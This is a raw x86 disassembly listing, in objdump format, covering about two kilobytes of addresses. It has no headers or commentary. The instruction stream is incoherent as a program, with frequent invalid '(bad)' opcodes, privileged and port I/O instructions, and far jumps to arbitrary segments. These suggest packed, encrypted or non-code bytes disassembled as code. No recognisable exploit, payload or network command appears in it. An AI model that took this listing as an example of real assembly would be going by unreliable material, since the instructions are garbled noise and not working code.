  433249:	adc    bh,BYTE PTR [ebp+0x633d8b41]
  43324f:	inc    esp
  433250:	enter  0xd9f3,0xfb
  433254:	cmc    
  433255:	or     ah,ah
  433257:	pop    es
  433258:	jne    0x43325c
  43325a:	fisttp DWORD PTR [edx]
  43325c:	or     bh,dh
  43325e:	in     al,0x3
  433260:	jne    0x43327b
  433262:	out    0xde,al
  433264:	dec    esp
  433265:	jns    0x43320a
  433267:	push   ebx
  433269:	mov    dh,0xe0
  43326b:	popf   
  43326c:	and    ch,BYTE PTR [edx+edx*4+0x3c1ac5b3]
  433273:	rcl    DWORD PTR [edx],1
  433275:	add    eax,0x7f664865
  43327a:	sub    BYTE PTR [ecx+0xfb37985],bl
  433280:	repz mov esi,0xb240b6f4
  433286:	ins    DWORD PTR es:[edi],dx
  433287:	leave  
  433288:	jb     0x433303
  43328a:	jmp    DWORD PTR [eax-0x1ab0842e]
  433290:	and    DWORD PTR [eax],ecx
  433292:	int    0x6a
  433294:	cmp    dh,ch
  433296:	ss stos BYTE PTR es:[edi],al
  433298:	in     eax,dx
  433299:	lods   eax,DWORD PTR ds:[esi]
  43329a:	mov    WORD PTR [edx],gs
  43329c:	fs jle 0x43325e
  43329f:	dec    edi
  4332a0:	popf   
  4332a1:	jnp    0x4332ef
  4332a3:	(bad)
  4332a6:	cmp    esi,ecx
  4332a8:	out    0x8d,al
  4332aa:	adc    al,0x69
  4332ac:	add    BYTE PTR [eax],al
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	add    dl,dh
  4332b2:	cld    
  4332b3:	add    BYTE PTR [edx],ah
  4332b5:	cld    
  4332b6:	cli    
  4332b7:	jg     0x4332de
  4332b9:	xchg   ecx,eax
  4332ba:	push   es
  4332bb:	add    edx,DWORD PTR [esi+edi*2]
  4332be:	cmp    BYTE PTR [ebx-0x1f],0x7b
  4332c2:	add    BYTE PTR [edi+eiz*8-0x13],dh
  4332c6:	inc    esp
  4332c7:	jp     0x43326d
  4332c9:	xchg   ebx,eax
  4332ca:	clc    
  4332cb:	cwde   
  4332cc:	jmp    0x202d:0x60d2f4bc
  4332d3:	push   es
  4332d4:	stos   DWORD PTR es:[edi],eax
  4332d5:	fldcw  WORD PTR [esi+0x7d60dce7]
  4332db:	inc    esp
  4332dc:	popa   
  4332dd:	cmp    DWORD PTR [edi-0x22071911],edi
  4332e3:	cli    
  4332e4:	dec    esi
  4332e5:	addr16 nop
  4332e7:	or     esi,DWORD PTR [edx+0x35]
  4332ea:	adc    BYTE PTR [eax],bh
  4332ec:	lods   al,BYTE PTR ds:[esi]
  4332ed:	mov    bh,al
  4332ef:	jge    0x4332c6
  4332f1:	xchg   DWORD PTR [eax],ecx
  4332f3:	cli    
  4332f4:	(bad)  
  4332f5:	fld    QWORD PTR [edi]
  4332f7:	dec    ebp
  4332f8:	xchg   ebx,eax
  4332f9:	jbe    0x433302
  4332fb:	adc    al,0xc9
  4332fd:	dec    edx
  4332fe:	(bad)  
  4332ff:	jmp    DWORD PTR [ecx+0x2d]
  433302:	and    BYTE PTR [esi-0x3c7ba14c],al
  433308:	add    ah,ah
  43330a:	push   eax
  43330b:	pop    eax
  43330c:	pop    ebx
  43330d:	ficomp DWORD PTR [bp+di-0x3d]
  433311:	add    DWORD PTR [ebp+0x83e6],eax
  433317:	add    BYTE PTR [eax],al
  433319:	add    al,bl
  43331b:	sbb    al,0x49
  43331d:	mov    edi,DWORD PTR [ecx]
  43331f:	push   es
  433320:	push   eax
  433321:	push   edi
  433322:	inc    edi
  433323:	jae    0x43332b
  433325:	xor    esp,DWORD PTR [edx-0x7daa039c]
  43332b:	dec    ecx
  43332c:	dec    ecx
  43332d:	(bad)  
  43332e:	popa   
  43332f:	jmp    0x7588:0xff9cfff5
  433336:	in     al,0x87
  433338:	jae    0x43331e
  43333a:	adc    eax,0x90e8e26b
  43333f:	xor    al,0xfa
  433341:	call   FWORD PTR [edi]
  433343:	mov    edx,0x6acc850e
  433348:	add    DWORD PTR [edi+0x4a],ebx
  43334b:	sub    eax,0x550e33ba
  433350:	and    ebp,0x534dbd89
  433356:	hlt    
  433357:	push   esp
  433358:	cmp    eax,DWORD PTR [eax]
  43335a:	dec    esp
  43335b:	jle    0x43331b
  43335d:	or     bh,al
  43335f:	(bad)  
  433360:	xchg   DWORD PTR [ebp-0x78],ebx
  433363:	xchg   DWORD PTR [ebx-0x20],edx
  433366:	ror    esp,1
  433368:	ins    DWORD PTR es:[edi],dx
  433369:	adc    bl,BYTE PTR [esi]
  43336b:	pop    es
  43336c:	jg     0x433369
  43336e:	mov    ebx,0xeffffaf1
  433373:	push   es
  433374:	xchg   DWORD PTR [ebp+0x60],ebx
  433377:	xchg   DWORD PTR [ebx-0x8],edx
  43337a:	xchg   edi,eax
  43337b:	in     al,dx
  43337c:	bound  eax,QWORD PTR [eax+eax*1]
  43337f:	add    BYTE PTR [eax],al
  433381:	add    BYTE PTR [eax],al
  433383:	and    bh,bh
  433385:	jmp    FWORD PTR [ecx+0x1d]
  433388:	gs cli 
  43338a:	(bad)  
  43338b:	jne    0x433393
  43338d:	jmp    0x81c3:0x8319b6cb
  433394:	xchg   edx,eax
  433395:	ret    0xf0fb
  433398:	fcom   DWORD PTR [edi+0x49e2a6b3]
  43339e:	add    esi,DWORD PTR [ebp+0x19]
  4333a1:	(bad)  
  4333a2:	ss ret 
  4333a4:	or     eax,DWORD PTR [edi-0x1e68a08]
  4333aa:	xchg   BYTE PTR [eax],bh
  4333ac:	and    eax,0x497e1b94
  4333b1:	(bad)  
  4333b2:	jle    0x433355
  4333b4:	sbb    dh,bh
  4333b6:	call   FWORD PTR [esi+0x75487926]
  4333bc:	mov    al,ds:0xcdeedba9
  4333c1:	or     eax,DWORD PTR [esi+0x4c7b6d28]
  4333c7:	test   DWORD PTR [edi+0x56f4f3c1],ecx
  4333cd:	inc    BYTE PTR [ebx]
  4333cf:	jne    0x4333ea
  4333d1:	adc    eax,0x75
  4333d4:	les    edi,FWORD PTR [edi]
  4333d6:	ins    DWORD PTR es:[edi],dx
  4333d7:	jnp    0x4333d1
  4333d9:	add    DWORD PTR [edi],esi
  4333db:	inc    ebp
  4333dc:	add    dh,dh
  4333de:	mov    BYTE PTR [eax+0x4574767f],dh
  4333e4:	push   ebp
  4333e5:	pop    es
  4333e6:	mov    DWORD PTR [eax],eax
  4333e8:	add    BYTE PTR [eax],al
  4333ea:	add    BYTE PTR [eax],al
  4333ec:	mov    al,ds:0x454c764f
  4333f1:	gs mov bl,bh
  4333f4:	out    dx,al
  4333f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4333f6:	sbb    eax,0x91152686
  4333fb:	jmp    0x4333fb
  4333fd:	xor    al,0xec
  4333ff:	jl     0x433426
  433401:	add    eax,0x6732163e
  433406:	cmp    eax,0x9a02646d
  43340b:	sti    
  43340c:	cmc    
  43340d:	sti    
  43340e:	jecxz  0x433417
  433410:	jne    0x433414
  433412:	cdq    
  433413:	or     dl,al
  433415:	push   es
  433416:	jecxz  0x43341b
  433418:	jne    0x433407
  43341a:	in     eax,0xdc
  43341c:	int3   
  43341d:	lea    esp,[edi+edi*8-0x6220b005]
  433424:	ficomp DWORD PTR [eax-0x6f]
  433427:	mov    bl,0x25
  433429:	jmp    0x4867:0x1cad01b
  433430:	xchg   WORD PTR [edi+0x348d4599],sp
  433437:	adc    bl,bh
  433439:	inc    edi
  43343a:	repz mov dl,0x38
  43343d:	push   edx
  43343e:	outs   dx,BYTE PTR ds:[esi]
  43343f:	leave  
  433440:	jp     0x4333cf
  433442:	pop    ds
  433443:	lock repz push edx
  433446:	jecxz  0x4333fc
  433448:	(bad)  
  433449:	aam    0x66
  43344b:	dec    eax
  43344c:	jp     0x43348b
  43344e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43344f:	cdq    
  433450:	add    BYTE PTR [eax],al
  433452:	add    BYTE PTR [eax],al
  433454:	add    BYTE PTR [ecx],ch
  433456:	(bad)  
  433457:	es adc ecx,esi
  43345a:	ret    0xd809
  43345d:	sti    
  43345e:	dec    esi
  43345f:	cmp    DWORD PTR [edx+ebp*8-0x164c10c2],0x17
  433467:	addr16 nop
  433469:	jb     0x43346e
  43346b:	push   ds
  43346c:	cdq    
  43346d:	jl     0x4333f1
  43346f:	jecxz  0x43346c
  433471:	dec    eax
  433472:	pop    es
  433473:	aam    0x6
  433475:	cmc    
  433476:	jge    0x433457
  433478:	add    dh,BYTE PTR [esi+0x76]
  43347b:	loope  0x433405
  43347d:	repnz and BYTE PTR [ebx+ebx*1],0x7f
  433482:	fwait
  433483:	out    0x45,al
  433485:	jae    0x433460
  433487:	add    BYTE PTR [eax+0x2c],ah
  43348a:	in     eax,0x5
  43348c:	sub    edx,DWORD PTR [eax+0x1c9ce856]
  433492:	mov    BYTE PTR [ebx+0x21],al
  433495:	xor    BYTE PTR [esi-0x10],al
  433498:	out    0xf4,al
  43349a:	es stc 
  43349c:	push   cs
  43349d:	xor    BYTE PTR [esp+ecx*1+0x72],0xb4
  4334a2:	hlt    
  4334a3:	aaa    
  4334a4:	lods   al,BYTE PTR ds:[esi]
  4334a5:	or     BYTE PTR [esi+edi*2],0xd5
  4334a9:	imul   edi,esp,0xfffffff9
  4334ac:	(bad)  
  4334ad:	in     al,0xc
  4334af:	test   DWORD PTR [eiz*2+0x73e9664f],edi
  4334b6:	push   ss
  4334b7:	and    BYTE PTR [ebp+0x0],ah
  4334bd:	add    BYTE PTR [edi+0x5d248700],dh
  4334c3:	mov    BYTE PTR [ebx-0x2f],cl
  4334c6:	das    
  4334c7:	sar    DWORD PTR [ebp-0x5b],1
  4334ca:	sahf   
  4334cb:	pop    es
  4334cc:	iret   
  4334cd:	out    0xf2,al
  4334cf:	(bad)  
  4334d0:	cli    
  4334d1:	scas   al,BYTE PTR es:[edi]
  4334d2:	or     DWORD PTR [eax+0xecf173],0x51
  4334d9:	cmp    edx,ecx
  4334db:	push   edx
  4334dc:	call   0xfa43e446
  4334e1:	push   0xffffffba
  4334e3:	adc    eax,DWORD PTR [ebx+0x74876ba9]
  4334e9:	jg     0x43355e
  4334eb:	cld    
  4334ec:	mov    ebp,DWORD PTR [eax*4-0x30597ab1]
  4334f3:	leave  
  4334f4:	call   0xfa3fb126
  4334f9:	push   0xffffffba
  4334fb:	add    eax,DWORD PTR [ebx+0x5c873b29]
  433501:	dec    edi
  433502:	cmp    esp,0xffffff8b
  433505:	add    cl,ah
  433507:	(bad)  
  433509:	mov    ebx,DWORD PTR [ebx+0x7c]
  43350c:	(bad)  
  43350d:	call   0x393f02
  433512:	lahf   
  433513:	inc    edi
  433514:	std    
  433515:	test   BYTE PTR [eax+eax*1-0x7b],bl
  433519:	inc    esp
  43351a:	bound  edx,QWORD PTR [eax]
  43351c:	idiv   BYTE PTR [ecx]
  43351e:	leave  
  43351f:	clts   
  433521:	test   DWORD PTR [eax],eax
  433523:	add    BYTE PTR [eax],al
  433525:	add    BYTE PTR [eax],al
  433527:	(bad)  
  433528:	or     eax,0xba61fff6
  43352d:	aad    0x52
  43352f:	addr16 dec eax
  433531:	or     dh,0x74
  433534:	in     al,dx
  433535:	bnd jmp ebx
  433538:	cmp    DWORD PTR [ebp+0x6465904],0xf6106f85
  433542:	call   DWORD PTR [ecx-0x39]
  433545:	cmc    
  433546:	push   eax
  433547:	pop    ss
  433548:	inc    ebp
  433549:	or     dh,0xc4
  43354c:	xchg   ecx,eax
  43354d:	repz jmp ebx
  433550:	cmp    DWORD PTR [ebp+0x6460904],0xf60d9785
  43355a:	call   FWORD PTR [edi]
  43355c:	(bad)  
  43355d:	cmc    
  43355e:	add    DWORD PTR [ebx-0x1c01ff78],edx
  433564:	or     eax,0x78fc5d82
  433569:	dec    esp
  43356a:	fmul   QWORD PTR [ecx+esi*4+0x1e8a5750]
  433571:	idiv   DWORD PTR [edx]
  433573:	dec    esp
  433574:	add    edi,DWORD PTR [ecx-0x3c]
  433577:	sub    BYTE PTR [eax+0x28d90fb9],cl
  43357d:	cld    
  43357e:	jmp    DWORD PTR [ebx+0x75fc547f]
  433584:	mov    ebx,0x1efec278
  433589:	sbb    al,0x31
  43358b:	add    BYTE PTR [eax],al
  43358d:	add    BYTE PTR [eax],al
  43358f:	add    BYTE PTR [edi],ch
  433591:	dec    eax
  433592:	or     edi,DWORD PTR [esi+0x39]
  433595:	in     eax,0x82
  433597:	mov    edi,0xfc3a6e6a
  43359c:	adc    dh,BYTE PTR [eax]
  43359e:	jge    0x43361c
  4335a0:	or     DWORD PTR [ecx-0xf84fe48],edi
  4335a6:	add    al,0xf8
  4335a9:	pop    ss
  4335aa:	or     eax,DWORD PTR [esi+0x59ab2d38]
  4335b0:	(bad)  
  4335b1:	sbb    esp,DWORD PTR [edi+0x409dd886]
  4335b7:	retf   
  4335b8:	test   eax,0xfeeb789d
  4335bd:	popf   
  4335be:	cmc    
  4335bf:	dec    esi
  4335c0:	and    esi,DWORD PTR [edx+edx*4+0xb]
  4335c4:	sub    dh,BYTE PTR [ebx+eax*2-0x7a]
  4335c8:	mov    esp,0x85c259e7
  4335cd:	fs sub al,0xc0
  4335d0:	popf   
  4335d1:	fdiv   DWORD PTR [esi+0x7c]
  4335d4:	ins    DWORD PTR es:[edi],dx
  4335d5:	ins    BYTE PTR es:[edi],dx
  4335d6:	and    BYTE PTR [edx],bl
  4335d8:	in     al,dx
  4335d9:	adc    al,BYTE PTR [eax]
  4335db:	xchg   DWORD PTR [ebp+0x70da59df],ebp
  4335e1:	ins    BYTE PTR es:[edi],dx
  4335e2:	and    al,0xa
  4335e4:	xor    dh,BYTE PTR [edx-0x79]
  4335e7:	pmaxsw mm2,QWORD PTR ds:0xa5210afc
  4335ee:	idiv   BYTE PTR [esi+0x52]
  4335f1:	add    eax,0xc27d
  4335f6:	add    BYTE PTR [eax],al
  4335f8:	add    BYTE PTR [ecx],ah
  4335fa:	in     eax,0xfd
  4335fc:	push   DWORD PTR [esp+eax*4]
  4335ff:	test   BYTE PTR [eax-0x3f872831],0xfe
  433606:	add    ah,BYTE PTR [ecx-0x4]
  433609:	push   cs
  43360a:	sti    
  43360b:	out    dx,al
  43360c:	sbb    BYTE PTR [edx],0x1e
  43360f:	pusha  
  433610:	sar    DWORD PTR [edx-0x77],0x28
  433614:	cld    
  433615:	fdivrp st(2),st
  433617:	in     al,dx
  433618:	inc    edx
  433619:	(bad)  
  43361b:	call   0x791d:0x28081342
  433622:	add    DWORD PTR [edi-0x34],0x102e38b
  433629:	sub    al,0x5d
  43362b:	jo     0x4335ee
  43362d:	jbe    0x4335ba
  43362f:	(bad)  [eax+0x3f1bc151]
  433635:	mov    esi,0xae3f33ce
  43363a:	into   
  43363b:	sub    edi,DWORD PTR [edi]
  43363d:	scas   al,BYTE PTR es:[edi]
  43363e:	into   
  43363f:	pushf  
  433640:	js     0x433620
  433642:	cmp    ebx,0x3a543b96
  433648:	jg     0x43361c
  43364a:	xor    edx,ebx
  43364c:	xlat   BYTE PTR ds:[ebx]
  43364d:	mov    ds:0x7891da39,eax
  433652:	(bad)  
  433653:	and    ch,BYTE PTR [esi+0x4f]
  433656:	pop    esp
  433657:	push   ds
  433658:	jg     0x4335f3
  43365a:	pop    edi
  43365b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43365c:	jg     0x43365e
  43365e:	add    BYTE PTR [eax],al
  433660:	add    BYTE PTR [eax],al
  433662:	xor    al,0x5a
  433664:	out    0xc1,al
  433666:	cmp    cl,BYTE PTR [ecx+0x4c7ba819]
  43366c:	xor    edi,DWORD PTR [edi+0x24]
  43366f:	xor    dh,BYTE PTR [edx]
  433671:	mov    ch,0x2a
  433673:	push   eax
  433674:	cmp    DWORD PTR [eax+edi*2],ebx
  433677:	cmp    bh,ah
  433679:	add    ebp,edx
  43367b:	(bad)  
  43367c:	fild   DWORD PTR [eax-0x791b89de]
  433682:	xor    edi,ebp
  433684:	add    BYTE PTR [edx+0x75438e31],al
  43368a:	add    DWORD PTR [edx+eax*2-0x17343de7],eax
  433691:	test   eax,0x6af9f869
  433696:	mov    ch,0x1
  433698:	sub    DWORD PTR [ecx],0x5
  43369b:	push   es
  43369c:	jge    0x4336d0
  43369e:	outs   dx,BYTE PTR ds:[esi]
  43369f:	in     al,0xa
  4336a1:	push   0xa250f0ec
  4336a6:	jns    0x4336a4
  4336a8:	ins    DWORD PTR es:[edi],dx
  4336a9:	in     al,0xbb
  4336ab:	call   0xd942:0x846e26f9
  4336b2:	jge    0x433702
  4336b4:	mov    WORD PTR [eax+0x51e8cb73],?
  4336ba:	jns    0x4336b4
  4336bc:	stc    
  4336bd:	push   0x35
  4336bf:	add    DWORD PTR [ebx+0x7efc0529],eax
  4336c5:	and    al,BYTE PTR [eax]
  4336c7:	add    BYTE PTR [eax],al
  4336c9:	add    BYTE PTR [eax],al
  4336cb:	jle    0x433651
  4336cd:	inc    edx
  4336ce:	mov    ecx,0x3b90564d
  4336d3:	inc    edx
  4336d4:	retf   
  4336d5:	call   0xfa3ba563
  4336da:	push   0x72
  4336dc:	add    DWORD PTR [ebx+0x7efbfaa9],eax
  4336e2:	mov    dl,0x6f
  4336e4:	mov    es,WORD PTR [ebx+0x55]
  4336e7:	out    0x83,al
  4336e9:	inc    edx
  4336ea:	stc    
  4336eb:	adc    ecx,ebx
  4336ed:	call   0xfa3bb553
  4336f2:	push   0x42
  4336f4:	add    DWORD PTR [ebx+0x7efbeaa9],eax
  4336fa:	mov    ds:0xd942847f,al
  4336ff:	in     eax,dx
  433700:	dec    esi
  433701:	cwde   
  433702:	add    BYTE PTR [ebp+0x7b],bh
  433705:	(bad)  
  433706:	call   0x393f67
  43370b:	fistp  QWORD PTR [ebx]
  43370d:	std    
  43370e:	test   BYTE PTR [esp+ecx*4],bl
  433711:	cli    
  433712:	add    BYTE PTR [edi+0x5c468208],0x79
  433719:	push   esp
  43371a:	pushf  
  43371b:	out    dx,al
  43371c:	jl     0x4336e5
  43371e:	call   0x393f27
  433723:	(bad)  
  433724:	cmp    edi,ebp
  433726:	test   BYTE PTR [ebx+ecx*4-0x6],cl
  43372a:	adc    BYTE PTR [edi+0x8],0x82
  43372e:	inc    ebp
  43372f:	add    BYTE PTR [eax],al
  433731:	add    BYTE PTR [eax],al
  433733:	add    BYTE PTR [eax-0x3e72b650],bh
  433739:	xor    esp,ecx
  43373b:	xchg   ecx,eax
  43373c:	pop    edx
  43373d:	or     dh,dh
  43373f:	mov    esp,DWORD PTR [edx]
  433741:	ror    BYTE PTR [ebp+ecx*2-0x317d49c4],1
  433748:	test   BYTE PTR [ecx+esi*8-0x1],dh
  43374c:	fild   DWORD PTR [ebp+0x3f610cbd]
  433752:	ins    DWORD PTR es:[edi],dx
  433753:	add    ebx,DWORD PTR [edi+0x3c]
  433756:	test   BYTE PTR [ebx+0x558cd692],0x98
  43375d:	mov    ah,0x82
  43375f:	into   
  433760:	mov    ah,0x8d
  433762:	icebp  
  433763:	(bad)  
  433764:	mov    ebx,0x1104bd85
  433769:	inc    esi
  43376a:	ins    DWORD PTR es:[edi],dx
  43376b:	add    ecx,DWORD PTR [edi]
  43376d:	cmp    eax,0xa618bf6
  433772:	mov    WORD PTR [ebp-0x28],cs
  433775:	ja     0x4337bb
  433777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433778:	pop    es
  433779:	shr    BYTE PTR [ecx],0x51
  43377c:	pop    es
  43377d:	cmp    BYTE PTR [eax+0x1c41757d],cl
  433783:	push   ebp
  433784:	ins    DWORD PTR es:[edi],dx
  433785:	mov    WORD PTR [edi],es
  433787:	jle    0x4337c2
  433789:	in     eax,dx
  43378a:	jp     0x43374b
  43378c:	loope  0x433776
  43378e:	test   dh,al
  433790:	push   edx
  433791:	pusha  
  433792:	test   eax,0x5025f8fb
  433797:	dec    edi
  433798:	add    BYTE PTR [eax],al
  43379a:	add    BYTE PTR [eax],al
  43379c:	add    dh,ch
  43379e:	stos   BYTE PTR es:[edi],al
  43379f:	int    0x86
  4337a1:	sub    esi,DWORD PTR [edx-0x57]
  4337a4:	stos   DWORD PTR es:[edi],eax
  4337a5:	cld    
  4337a6:	aad    0x4d
  4337a8:	out    0x4c,eax
  4337aa:	push   esp
  4337ab:	pop    es
  4337ac:	cli    
  4337ad:	imul   BYTE PTR [eax+eax*1]
  4337b0:	test   DWORD PTR ds:0x3e7f04b5,esi
  4337b6:	xor    al,0x7b
  4337b8:	inc    ecx
  4337b9:	inc    ebp
  4337ba:	pop    esi
  4337bb:	mov    cl,0xb7
  4337bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4337be:	jo     0x4337f6
  4337c0:	out    0x34,eax
  4337c2:	adc    al,0x7
  4337c4:	cli    
  4337c5:	imul   BYTE PTR [eax+eax*1]
  4337c8:	test   DWORD PTR [ebp-0x5180fb6c],esi
  4337ce:	add    edi,DWORD PTR [ebx+0x41]
  4337d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4337d2:	outs   dx,BYTE PTR ds:[esi]
  4337d3:	test   eax,0x366027bb
  4337d8:	out    0x1c,eax
  4337da:	hlt    
  4337db:	or     dl,bh
  4337dd:	imul   BYTE PTR [ecx+edi*8+0x354b584]
  4337e4:	jg     0x4337a4
  4337e6:	shl    DWORD PTR [edx+0x44],cl
  4337e9:	mov    ch,0x38
  4337eb:	jnp    0x43382e
  4337ed:	gs jo  0x433827
  4337f0:	out    0x4,eax
  4337f2:	mov    ah,0x8
  4337f4:	cli    
  4337f5:	imul   BYTE PTR [ecx+edi*8+0x334b584]
  4337fc:	jg     0x4337ac
  4337fe:	add    DWORD PTR [edx+0x7c],esp
  433804:	add    BYTE PTR [eax],al
  433806:	xor    al,0x32
  433808:	ins    BYTE PTR es:[edi],dx
  433809:	mov    dh,0x36
  43380b:	push   esp
  43380c:	pop    esi
  43380d:	cmp    DWORD PTR [edx+0x7c],edx
  433810:	xchg   edx,eax
  433811:	or     BYTE PTR [edi-0x7a],bl
  433814:	stos   DWORD PTR es:[edi],eax
  433815:	push   ecx
  433817:	ret    0x4f3
  43381a:	ror    ch,cl
  43381c:	jb     0x43389a
  43381e:	mov    ah,0x32
  433820:	pop    esp
  433821:	scas   al,BYTE PTR es:[edi]
  433822:	cmp    dl,BYTE PTR [ebp+0x6e]
  433825:	cmp    DWORD PTR [edx-0x3c],edx
  433828:	push   edx
  433829:	or     BYTE PTR [edi],ch
  43382b:	xchg   BYTE PTR [ebx],ch
  43382d:	push   ecx
  43382f:	ret    0x4d3
  433832:	mov    ds:0xb17642cd,al
  433837:	not    BYTE PTR [edi+0x5e32b47c]
  43383d:	cmp    DWORD PTR [edx],edx
  43383f:	lods   al,BYTE PTR ds:[esi]
  433840:	xor    cl,BYTE PTR [eax]
  433842:	inc    DWORD PTR [ebp-0x3d0e00d5]
  433848:	xchg   ebx,eax
  433849:	add    al,0x72
  43384b:	int    0x12
  43384d:	jl     0x433888
  43384f:	mul    BYTE PTR [eax-0x7a]
  433852:	fimul  DWORD PTR [ebp+0x47ed4f84]
  433858:	add    edi,DWORD PTR [edx+0x51]
  43385b:	imul   BYTE PTR [esp+ebp*1+0x7f]
  43385f:	jg     0x43388d
  433861:	add    esi,DWORD PTR [ebp+0x2]
  433864:	outs   dx,BYTE PTR ds:[esi]
  433865:	shr    DWORD PTR [edx+0x7f],0xa7
  433869:	nop
  43386a:	add    BYTE PTR [eax],al
  43386c:	add    BYTE PTR [eax],al
  43386e:	add    BYTE PTR ds:0x63f0248d,dh
  433874:	sti    
  433875:	push   esi
  433876:	cld    
  433877:	cli    
  433878:	push   ss
  433879:	jmp    0xfc03:0xcef6197c
  433880:	inc    edi
  433881:	add    BYTE PTR [ebp+0x874fcf4],dh
  433887:	hlt    
  433888:	retf   0x474
  43388b:	dec    BYTE PTR [ebp-0x4]
  43388e:	jb     0x4338bb
  433890:	sub    DWORD PTR [esi+0x62],ecx
  433893:	sbb    ebx,DWORD PTR ds:0x5236250
  433899:	dec    edi
  43389a:	sbb    esi,DWORD PTR [edx-0x37]
  43389d:	jge    0x433844
  43389f:	dec    ecx
  4338a0:	xor    BYTE PTR [ebx+0x75],al
  4338a3:	in     eax,0xf7
  4338a5:	jle    0x433849
  4338a7:	jp     0x4338c9
  4338a9:	jnp    0x433910
  4338ab:	mov    eax,0x5e64fc76
  4338b0:	outs   dx,BYTE PTR ds:[esi]
  4338b1:	jae    0x43391d
  4338b3:	cld    
  4338b4:	adc    BYTE PTR [eax],al
  4338b6:	aad    0xb
  4338b8:	add    BYTE PTR [ebx-0x7f],0x9e
  4338bc:	jbe    0x4338da
  4338be:	add    dl,BYTE PTR [edx+0x68]
  4338c1:	(bad)  
  4338c2:	popa   
  4338c3:	jns    0x43393d
  4338c5:	jnp    0x4338f4
  4338c7:	jns    0x433937
  4338c9:	pop    ds
  4338ca:	jb     0x433900
  4338cc:	std    
  4338cd:	test   DWORD PTR [edi+0x6fff5ec6],ebp
  4338d3:	add    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR [eax],al
  4338d7:	add    BYTE PTR [edi],ah
  4338d9:	dec    ecx
  4338da:	dec    edi
  4338db:	mov    bh,0x7e
  4338dd:	ret    
  4338de:	xor    ecx,ebp
  4338e0:	jbe    0x43395b
  4338e2:	(bad)  
  4338e3:	aad    0xf5
  4338e5:	mov    eax,0x3e49ec73
  4338ea:	cld    
  4338eb:	add    dh,BYTE PTR [esi+0x79]
  4338ee:	(bad)
  4338f1:	jne    0x4338ab
  4338f3:	jmp    0x54c057f8
  4338f8:	popf   
  4338f9:	clc    
  4338fa:	jae    0x433901
  4338fc:	push   ds
  4338fd:	dec    esi
  4338fe:	sbb    BYTE PTR [eax],al
  433900:	daa    
  433901:	mov    bh,0x29
  433903:	mov    esp,DWORD PTR [edx-0x16]
  433906:	dec    esi
  433907:	push   edx
  433908:	pop    ss
  433909:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43390a:	std    
  43390b:	dec    edi
  43390c:	pop    ebp
  43390d:	add    ebx,ecx
  43390f:	or     eax,0xfffffff4
  433912:	sub    cl,cl
  433914:	push   edi
  433915:	cmp    DWORD PTR [esi+eax*1+0x4f],esi
  433919:	inc    esp
  43391a:	xor    cl,al
  43391c:	mov    BYTE PTR [ebx],al
  43391e:	jns    0x4338eb
  433920:	repz jl 0x433967
  433923:	mov    eax,0xcf223bc7
  433928:	pop    ebp
  433929:	mov    ebx,0x7d54ebf5
  43392e:	push   esp
  43392f:	mov    eax,0x8bf5b34d
  433934:	pop    esi
  433935:	adc    dl,0xf
  433938:	cdq    
  433939:	add    BYTE PTR ss:[eax],al
  43393c:	add    BYTE PTR [eax],al
  43393e:	add    BYTE PTR [eax],al
  433940:	add    BYTE PTR [ebx+eax*4],cl
  433943:	mov    ecx,0xe2880f
  433948:	add    BYTE PTR [edi+edx*8],bl
  43394b:	inc    esp
  43394c:	cld    
  43394d:	xchg   ebp,eax
  43394e:	stos   BYTE PTR es:[edi],al
  43394f:	in     eax,dx
  433950:	je     0x4339cb
  433952:	jnp    0x433998
  433954:	cld    
  433955:	cmc    
  433956:	cdq    
  433957:	add    BYTE PTR [edx+0x2c],dl
  43395a:	jge    0x43399b
  43395c:	xor    BYTE PTR [esi+eiz*4],ch
  43395f:	loope  0x4339aa
  433961:	retf   
  433962:	add    eax,DWORD PTR [eax]
  433964:	or     DWORD PTR [eax-0x2c308519],0x77
  43396b:	mov    ecx,0x4476d975
  433970:	cld    
  433971:	ja     0x43396b
  433973:	sbb    bh,0xa7
  433976:	add    DWORD PTR [ecx-0x31],edi
  433979:	rol    DWORD PTR [ecx-0x168a4784],cl
  43397f:	hlt    
  433980:	adc    DWORD PTR [esi-0x11000217],0x408cd427
  43398a:	mov    ecx,0xc1bb86ad
  43398f:	div    ecx
  433991:	sub    BYTE PTR [eax+0x6671c37f],0x44
  433998:	jae    0x433a11
  43399a:	je     0x4339bf
  43399c:	xchg   BYTE PTR [ebx+0x5d5472d9],dh
  4339a2:	cmp    esi,DWORD PTR [edi-0x37]
  4339a5:	add    BYTE PTR [eax],al
  4339a7:	add    BYTE PTR [eax],al
  4339a9:	add    BYTE PTR [ebp+0x75],cl
  4339ac:	or     edx,edi
  4339ae:	push   edx
  4339af:	ins    BYTE PTR es:[edi],dx
  4339b0:	inc    eax
  4339b1:	add    esi,eax
  4339b3:	test   al,0x90
  4339b5:	std    
  4339b6:	out    dx,eax
  4339b7:	xchg   DWORD PTR [edi+0x7c],edi
  4339ba:	inc    ebp
  4339bb:	jmp    0x7451:0xd66c798a
  4339c2:	mov    BYTE PTR [ecx+eax*4-0x51],ch
  4339c6:	jne    0x433996
  4339c8:	in     al,dx
  4339c9:	mov    WORD PTR [eax-0x44794b73],?
  4339cf:	stc    
  4339d0:	js     0x43399b
  4339d2:	sbb    eax,0x2fa0a6d
  4339d7:	ins    BYTE PTR es:[edi],dx
  4339d8:	inc    eax
  4339d9:	add    esi,eax
  4339db:	sub    BYTE PTR [eax-0x3ac80003],dl
  4339e1:	jl     0x4339f4
  4339e3:	xchg   esi,eax
  4339e4:	loop   0x433a64
  4339e6:	pusha  
  4339e7:	inc    ecx
  4339e8:	add    al,0x75
  4339ea:	xor    BYTE PTR [edx+edi*4+0x2f],0x0
  4339ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4339f0:	pop    ecx
  4339f1:	push   eax
  4339f2:	(bad)  
  4339f3:	push   ds
  4339f4:	sbb    al,0x95
  4339f6:	retf   
  4339f7:	out    0x4,eax
  4339f9:	jle    0x4339ac
  4339fb:	add    ebx,ebp
  4339fd:	jle    0x4339f1
  4339ff:	ins    DWORD PTR es:[edi],dx
  433a00:	in     eax,0x78
  433a02:	iret   
